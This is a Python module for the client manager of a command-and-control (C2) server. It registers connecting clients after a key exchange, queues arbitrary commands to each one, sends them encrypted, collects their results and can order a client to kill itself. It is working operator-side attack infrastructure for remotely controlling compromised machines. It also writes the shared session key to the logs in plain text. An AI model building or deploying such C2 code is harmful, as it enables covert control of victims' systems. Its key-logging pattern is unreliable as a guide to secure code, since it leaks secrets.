"""
Client Manager for C2 Server
Handles all client-related operations following SOLID principles
"""

import asyncio
import logging
import time
import uuid
from typing import Dict, List, Optional
from .client_state import ClientState
from .message import Message
from .message_type import MessageType
from .command_type import CommandType
from .send_receive_msgs import send_message, receive_message

logger = logging.getLogger(__name__)


class ClientManager:
    """Manages all client connections and operations"""
    
    def __init__(self, encryption_manager):
        self.clients: Dict[str, ClientState] = {}
        self._encryption_manager = encryption_manager
        self._shutdown_event = asyncio.Event()
    
    def set_shutdown_event(self, event: asyncio.Event):
        """Set the shutdown event for coordinated shutdown"""
        self._shutdown_event = event
    
    async def register_client(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter) -> Optional[ClientState]:
        """Register a new client connection"""
        try:
            msg = await receive_message(reader)
            msg = Message.from_payload(msg)
            
            if not msg or msg.type is not MessageType.REGISTER:
                logger.warning(f"Invalid registration message: {msg.type}")
                writer.close()
                return None
            
            client_id = msg.client_id
            client_state = ClientState(client_id, reader, writer)
            
            # Handle encryption setup
            self._encryption_manager.compute_session_key(msg.command)
            logger.info(f"Shared key: {self._encryption_manager.session_key}")
            
            self.clients[client_id] = client_state
            logger.info(f"Client registered: {client_id}")
            
            # Send acknowledgment
            serialized_public_key = self._encryption_manager.serialized_public_key
            await send_message(writer, Message.as_ack(client_id, serialized_public_key).to_payload(True))
            
            return client_state
            
        except Exception as e:
            logger.error(f"Client registration error: {e}")
            return None
    
    def get_client(self, client_id: str) -> Optional[ClientState]:
        """Get client by ID"""
        return self.clients.get(client_id)
    
    def list_clients(self) -> Dict[str, ClientState]:
        """Get all clients"""
        return self.clients.copy()
    
    def add_command_to_queue(self, client_id: str, command: str) -> bool:
        """Add command to client's queue"""
        if client_id not in self.clients:
            return False
        
        cmd_id = str(uuid.uuid4())
        client_state = self.clients[client_id]
        client_state.command_queue.put_nowait({
            "cmd_id": cmd_id,
            "command": command,
        })
        return True
    
    def kill_client(self, client_id: str) -> bool:
        """Send kill command to client"""
        if client_id not in self.clients:
            return False
        
        if self.add_command_to_queue(client_id, CommandType.KILL.value):
            self.clients[client_id].set_killing()
            return True
        return False
    
    async def handle_client_loop(self, client_state: ClientState):
        """Handle the main client communication loop"""
        try:
            tasks = [
                asyncio.create_task(self._command_receiver(client_state)),
                asyncio.create_task(self._command_executor(client_state)),
            ]
            await asyncio.gather(*tasks, return_exceptions=True)
        except asyncio.CancelledError:
            logger.info("Client loop cancelled")
        except Exception as e:
            logger.error(f"Client loop error: {e}")
        finally:
            await self._cancel_tasks(tasks)
    
    async def _command_receiver(self, client_state: ClientState):
        """Receive messages from client"""
        try:
            while True:
                if not client_state.is_connected:
                    await self._handle_killed_client(client_state)
                    break
                
                msg = await receive_message(client_state.reader)
                if not msg:
                    logger.warning("Received an empty message")
                    break
                
                if self._shutdown_event.is_set():
                    logger.info('shutdown detected from receiver')
                    break
                
                msg = self._encryption_manager.decrypt(msg)
                
                if msg.type is MessageType.RESULT:
                    logger.info(f"Result from {client_state.client_id}: {msg.result[:100]}")
                    
                    if msg.cmd_id in client_state.pending_results:
                        del client_state.pending_results[msg.cmd_id]
                        
                        if client_state.is_killing:
                            if client_state.pending_results:
                                continue  # wait for all results to arrive
                            else:
                                client_state.set_killed()
                else:
                    logger.warning(f"Unknown message type: {msg.type}")
        
        except asyncio.CancelledError:
            logger.info("Command receiver cancelled")
        except asyncio.IncompleteReadError:
            logger.info("Connection closed")
        except Exception as e:
            logger.error(f"Command receiver error: {e}")
    
    async def _command_executor(self, client_state: ClientState):
        """Execute commands queued for client"""
        try:
            while True:
                if not client_state.is_connected:
                    break
                
                cmd_data = await client_state.command_queue.get()
                
                if self._shutdown_event.is_set():
                    logger.info('shutdown detected from executor')
                    break
                
                cmd_id = cmd_data.get("cmd_id")
                command = cmd_data.get("command")
                
                client_state.pending_results[cmd_id] = command
                msg = Message.as_command(cmd_id, command)
                msg = self._encryption_manager.encrypt(msg)
                
                await send_message(client_state.writer, msg)
                logger.info(f"Command sent to {client_state.client_id}: {command}")
        
        except asyncio.CancelledError:
            logger.info("Command executor cancelled")
        except Exception as e:
            logger.error(f"Command executor error: {e}")
    
    async def _handle_killed_client(self, client_state: ClientState):
        """Handle killed client connection"""
        if not client_state.is_killed:
            return
        if not client_state.writer or client_state.writer.is_closing():
            return
        
        client_state.writer.close()
        try:
            await asyncio.wait_for(client_state.writer.wait_closed(), timeout=1.0)
        except asyncio.TimeoutError:
            logger.info(f"Timeout waiting for writer to close for {client_state.client_id}")
        
        client_state.writer = None
        client_state.reader = None
        logger.info(f"Closed writer for killed client {client_state.client_id}")
    
    async def close_all_clients(self):
        """Close all client connections"""
        for client_id, client_state in self.clients.items():
            if client_state.writer and not client_state.writer.is_closing():
                client_state.writer.close()
                try:
                    await asyncio.wait_for(client_state.writer.wait_closed(), timeout=1.0)
                except asyncio.TimeoutError:
                    logger.info(f"Timeout waiting for writer to close for {client_id}")
                logger.info(f"Closed writer for {client_id}")
        
        self.clients.clear()
    
    @staticmethod
    async def _cancel_tasks(tasks: List[asyncio.Task]):
        """Cancel all tasks gracefully"""
        try:
            for task in tasks:
                if not task.done():
                    task.cancel()
        except Exception as e:
            logger.error(f"Error cancelling tasks: {e}")
    
    def print_client_list(self):
        """Print formatted client list"""
        if not self.clients:
            print("No clients connected")
            return
        
        print("\n" + "="*60)
        print(f"{'Client ID':<20} {'Status':<12} {'Last HB':<12}")
        print("="*60)
        
        for client_id, state in self.clients.items():
            last_hb = time.time() - state.last_heartbeat
            hb_str = f"{last_hb:.1f}s ago"
            print(f"{client_id:<20} {state.status:<12} {hb_str:<12}")
        
        print("="*60 + "\n")